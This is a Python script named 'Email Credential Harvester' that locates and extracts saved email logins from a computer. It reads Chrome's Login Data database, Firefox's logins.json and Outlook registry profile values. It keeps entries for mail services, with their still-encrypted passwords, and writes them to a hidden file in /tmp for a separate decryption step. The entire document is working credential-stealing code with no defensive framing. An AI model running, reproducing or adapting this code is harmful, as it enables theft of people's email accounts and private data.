#!/usr/bin/env python3
"""
Email Credential Harvester
Extracts saved email passwords from browsers and email clients
"""

import os
import re
import json
import sqlite3
import shutil
import tempfile
import platform
from glob import glob

def extract_chrome():
    """Extract saved passwords from Chrome/Chromium"""
    creds = []
    
    if platform.system() == "Linux":
        base = os.path.expanduser("~/.config/google-chrome")
    elif platform.system() == "Windows":
        base = os.path.expanduser("~\\AppData\\Local\\Google\\Chrome\\User Data")
    else:
        base = os.path.expanduser("~/Library/Application Support/Google/Chrome")
    
    login_db = os.path.join(base, "Default", "Login Data")
    
    if os.path.exists(login_db):
        tmp = tempfile.mktemp()
        shutil.copy2(login_db, tmp)
        
        conn = sqlite3.connect(tmp)
        cursor = conn.cursor()
        cursor.execute("""
            SELECT origin_url, username_value, password_value, date_created
            FROM logins
        """)
        
        for url, username, pwd_enc, date in cursor.fetchall():
            if any(d in url.lower() for d in ['mail', 'email', 'gmail', 'outlook', 'office', 'exchange']):
                creds.append({
                    "source": "Chrome",
                    "url": url,
                    "username": username,
                    "password_encrypted": pwd_enc.hex(),
                    "type": "email"
                })
        
        conn.close()
        os.remove(tmp)
    
    return creds

def extract_firefox():
    """Extract saved passwords from Firefox"""
    creds = []
    
    if platform.system() == "Linux":
        profiles = glob(os.path.expanduser("~/.mozilla/firefox/*.default*"))
    elif platform.system() == "Windows":
        profiles = glob(os.path.expanduser("~\\AppData\\Roaming\\Mozilla\\Firefox\\Profiles\\*.default*"))
    else:
        profiles = glob(os.path.expanduser("~/Library/Application Support/Firefox/Profiles/*.default*"))
    
    for profile in profiles:
        logins_file = os.path.join(profile, "logins.json")
        if os.path.exists(logins_file):
            with open(logins_file, "r") as f:
                data = json.load(f)
            
            for entry in data.get("logins", []):
                hostname = entry.get("hostname", "")
                if any(d in hostname.lower() for d in ['mail', 'email', 'gmail', 'outlook', 'office']):
                    creds.append({
                        "source": "Firefox",
                        "url": hostname,
                        "username": entry.get("encryptedUsername", ""),
                        "password_encrypted": entry.get("encryptedPassword", ""),
                        "type": "email"
                    })
    
    return creds

def extract_outlook():
    """Extract Outlook/Windows Mail credentials"""
    creds = []
    
    if platform.system() == "Windows":
        import winreg
        try:
            key = winreg.OpenKey(
                winreg.HKEY_CURRENT_USER,
                r"Software\Microsoft\Office\16.0\Outlook\Profiles\Outlook\9375CFF0413111d3B88A00104B2A6676"
            )
            # Enumerate account values
            i = 0
            while True:
                try:
                    name, value, _ = winreg.EnumValue(key, i)
                    if 'Email' in name or 'SMTP' in name or 'POP3' in name:
                        creds.append({
                            "source": "Outlook",
                            "key": name,
                            "value": value,
                            "type": "email"
                        })
                    i += 1
                except WindowsError:
                    break
            winreg.CloseKey(key)
        except:
            pass
    
    return creds

if __name__ == "__main__":
    print("[*] Harvesting saved email credentials...")
    
    all_creds = []
    all_creds.extend(extract_chrome())
    all_creds.extend(extract_firefox())
    all_creds.extend(extract_outlook())
    
    print(f"[+] Found {len(all_creds)} email credential entries")
    
    for cred in all_creds:
        print(f"\n[{cred['source']}] {cred.get('url', 'N/A')}")
        print(f"    Username: {cred.get('username', 'N/A')}")
        print(f"    Password: [encrypted - use decrypt module]")
    
    # Save to file
    with open("/tmp/.email_creds.json", "w") as f:
        json.dump(all_creds, f, indent=2)
    print(f"\n[+] Saved to /tmp/.email_creds.json")